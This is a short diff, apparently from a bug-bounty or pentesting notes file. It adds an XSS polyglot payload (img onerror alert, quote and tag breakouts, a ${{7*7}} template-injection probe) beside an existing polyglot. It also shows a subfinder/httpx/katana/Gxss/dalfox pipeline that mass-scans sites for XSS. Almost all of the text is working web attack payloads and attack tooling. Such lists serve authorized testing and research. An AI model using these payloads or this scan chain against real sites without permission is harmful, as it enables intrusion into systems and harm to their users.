@@ -8,6 +8,8 @@
 
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*/*\/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 
+\u0022\u003c%26quot;%26gt;%26lt;"';}};“></SCRIPT><img src=x onerror=alert(document.location)>${{7*7}}
+
 # Command line: (Ref https://www.linkedin.com/posts/steven-guimar%C3%A3es-29aa79212_bount-pentest-penetrationtesting-activity-7013963248324501504-kn5U?utm_source=share&utm_medium=member_desktop )
 XSS = cat sites.txt | subfinder -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
 
